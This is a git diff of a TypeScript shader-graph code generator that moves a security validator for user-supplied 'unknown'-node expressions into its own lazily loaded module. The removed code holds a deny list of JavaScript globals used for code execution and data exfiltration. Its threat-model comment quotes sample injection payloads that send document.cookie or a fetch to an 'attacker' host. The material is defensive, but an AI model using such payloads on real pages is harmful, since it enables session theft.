@@ -1,5 +1,3 @@
-import { parseExpression } from '@babel/parser';
-import type { Node } from '@babel/types';
 import type { AppNode, AppEdge, NodeDefinition, GeneratedCode, ShaderNodeData } from '@/types';
 import { getNodeValues } from '@/types';
 import {
@@ -29,6 +27,10 @@ import {
 } from '@/utils/soundAnalysis';
 import type { SoundChannel } from '@/utils/soundAnalysis';
 import { imageAssetFor } from './imageAssets';
+// The `unknown`-node expression validator. Its own module because it is the
+// only thing in codegen that needs @babel/parser, which is loaded on demand
+// there rather than pinned into the boot payload — see that file.
+import { isSafeUnknownExpression } from './unknownExpression';
 // Shape inference (1-4 channels) — the same authority the edge/preview layer
 // uses, so codegen and the UI agree on what counts as a scalar.
 import { getNodeOutputShape, portShapeForHandle } from './cpuEvaluator';
@@ -233,143 +235,6 @@ const TSL_IDENTIFIER_RE = /^[A-Za-z_$][A-Za-z0-9_$]*$/;
 export function hexLiteral(value: unknown): string {
   const s = String(value ?? '');
   return /^#[0-9a-fA-F]{6}$/.test(s) ? `0x${s.slice(1)}` : '0x000000';
-}
-
-/**
- * Identifiers that must never appear anywhere in an `unknown`-node expression.
- * These are the gateways to code execution / exfiltration / navigation. Used
- * both as callee names and as referenced/member identifiers, so a payload
- * can't reach them via `window.eval`, `globalThis.fetch`, bracket access, etc.
- */
-const FORBIDDEN_GLOBALS = new Set([
-  'eval', 'Function', 'fetch', 'import', 'require', 'globalThis',
-  'window', 'document', 'self', 'top', 'parent', 'frames', 'navigator',
-  'location', 'localStorage', 'sessionStorage', 'indexedDB', 'postMessage',
-  'XMLHttpRequest', 'WebSocket', 'EventSource', 'Worker', 'SharedWorker',
-  'setTimeout', 'setInterval', 'queueMicrotask', 'constructor', '__proto__',
-  'prototype', 'alert', 'open',
-]);
-
-/**
- * Recursively decide whether an expression AST node is a *pure data/TSL
- * expression* — literals, identifiers, swizzles, arithmetic, and calls to
- * (non-forbidden) functions whose arguments are themselves safe. Anything that
- * can execute attacker code — arrow functions / function expressions (IIFEs),
- * assignments, sequence/comma operators, computed (bracket) member access,
- * `new`, template literals, spreads, await/yield — falls through to the
- * `default` case and is rejected.
- */
-function isSafeExprNode(node: Node | null | undefined): boolean {
-  if (!node) return false;
-  switch (node.type) {
-    case 'NumericLiteral':
-    case 'StringLiteral':
-    case 'BooleanLiteral':
-    case 'NullLiteral':
-    case 'BigIntLiteral':
-    case 'DecimalLiteral':
-      return true;
-    case 'Identifier':
-      return !FORBIDDEN_GLOBALS.has(node.name);
-    case 'UnaryExpression':
-      // Allow the numeric/logical unaries that show up in real expressions
-      // (e.g. `-1.0`, `!flag`); reject `delete`/`typeof`/`void`.
-      return (node.operator === '-' || node.operator === '+' || node.operator === '!') &&
-        isSafeExprNode(node.argument);
-    case 'BinaryExpression':
-      return ['+', '-', '*', '/', '%', '**'].includes(node.operator) &&
-        node.left.type !== 'PrivateName' &&
-        isSafeExprNode(node.left) && isSafeExprNode(node.right);
-    case 'ArrayExpression':
-      // A `null` element is an array hole; a SpreadElement falls through to
-      // isSafeExprNode's default and is rejected.
-      return node.elements.every((el) => el == null || isSafeExprNode(el));
-    case 'MemberExpression':
-      // Only `obj.prop` (static, non-forbidden property) — never `obj[expr]`.
-      return !node.computed &&
-        node.property.type === 'Identifier' &&
-        !FORBIDDEN_GLOBALS.has(node.property.name) &&
-        isSafeExprNode(node.object);
-    case 'CallExpression': {
-      const callee = node.callee;
-      if (callee.type === 'Identifier') {
-        if (FORBIDDEN_GLOBALS.has(callee.name)) return false;
-      } else if (callee.type === 'MemberExpression') {
-        // Method-chain callee, e.g. `vec3(...).mul(2)` — validate the chain.
-        if (!isSafeExprNode(callee)) return false;
-      } else {
-        // Super(), import(), an IIFE callee, a tagged template, etc.
-        return false;
-      }
-      return node.arguments.every((a) => isSafeExprNode(a));
-    }
-    default:
-      return false;
-  }
-}
-
-/**
- * The `unknown`-node round-trip stores the original call-expression substring
- * in `rawExpression`. graphToCode re-emits it verbatim into the generated
- * module, so a hand-edited `.fastshader` file (or anything else that can write
- * the graph payload) could swap that string for something like
- * `foo((()=>{ window.location='http://attacker/'+document.cookie })())` or
- * `foo(fetch('http://attacker'))` and inject arbitrary JS into the executing
- * shader module.
- *
- * codeToGraph's parser only ever stores the slice of a single CallExpression
- * with a bare-identifier callee. We re-parse on emit and require:
- *   1. parses cleanly as a JS expression (not a statement list)
- *   2. is a CallExpression
- *   3. the callee is a plain Identifier (no `something.eval(...)` /
- *      `(()=>{...})()` / bracket-property access at the top level)
- *   4. EVERY node in the subtree — including the arguments — is a pure
- *      data/TSL expression (isSafeExprNode), so the arguments can't smuggle
- *      `fetch`, an arrow-function IIFE, an assignment, etc.
- *
- * Sandboxing the preview iframe means even a successful injection lands in
- * an opaque-origin frame with no localStorage access, but defense in depth
- * is cheap here: keep the inert fallback (`float(0)`) so the shader still
- * compiles and the editor shows the magenta unknown-node tile, instead of
- * mid-flight surprising the user with attacker JS.
- */
-/**
- * Verdict cache: codegen re-runs on every graph change (per keystroke while
- * scrubbing), and each pass re-parsed every unknown node's rawExpression with
- * Babel. The verdict is a pure function of the string, so memoize it —
- * size-capped so pathological churn (many distinct adversarial expressions)
- * can't grow it unboundedly.
- */
-const unknownExprVerdicts = new Map<string, boolean>();
-const UNKNOWN_EXPR_CACHE_MAX = 500;
-/** Expressions above this aren't cached — rawExpression is adversarial input,
- *  and 500 pinned multi-hundred-KB strings would be a memory hold. */
-const UNKNOWN_EXPR_CACHE_MAX_LEN = 4096;
-
-function isSafeUnknownExpression(expr: string): boolean {
-  const cached = unknownExprVerdicts.get(expr);
-  if (cached !== undefined) return cached;
-  let verdict = false;
-  try {
-    const ast = parseExpression(expr, { sourceType: 'module', plugins: ['typescript'] });
-    verdict =
-      ast.type === 'CallExpression' &&
-      ast.callee.type === 'Identifier' &&
-      // Deep-validate the whole call (callee name + every argument subtree).
-      isSafeExprNode(ast);
-  } catch {
-    verdict = false;
-  }
-  if (expr.length <= UNKNOWN_EXPR_CACHE_MAX_LEN) {
-    // Evict oldest-first (Map preserves insertion order) instead of a
-    // wholesale clear, so a hot graph keeps its working set warm.
-    if (unknownExprVerdicts.size >= UNKNOWN_EXPR_CACHE_MAX) {
-      const oldest = unknownExprVerdicts.keys().next().value;
-      if (oldest !== undefined) unknownExprVerdicts.delete(oldest);
-    }
-    unknownExprVerdicts.set(expr, verdict);
-  }
-  return verdict;
 }
 
 interface GraphIndex {
@@ -851,9 +716,14 @@ export function graphToCode(
 
     // Unknown nodes: emit the preserved raw expression verbatim, but only
     // after verifying it still looks like the simple `funcName(args)` shape
-    // codeToGraph produces. See isSafeUnknownExpression for the threat
+    // codeToGraph produces. See engine/unknownExpression.ts for the threat
     // model — adversarial graph payloads otherwise get to inject arbitrary
     // statements into the generated module.
+    //
+    // The validator's parser is loaded on demand, so a pass that runs before it
+    // lands answers `false` (fail closed) and this emits the inert fallback;
+    // subscribers of onUnknownExpressionValidated re-run the pass once the real
+    // verdict is available (useSyncEngine does).
     if (def.type === 'unknown') {
       const nv = getNodeValues(node);
       const rawExpr = String(nv.rawExpression ?? 'float(0)');
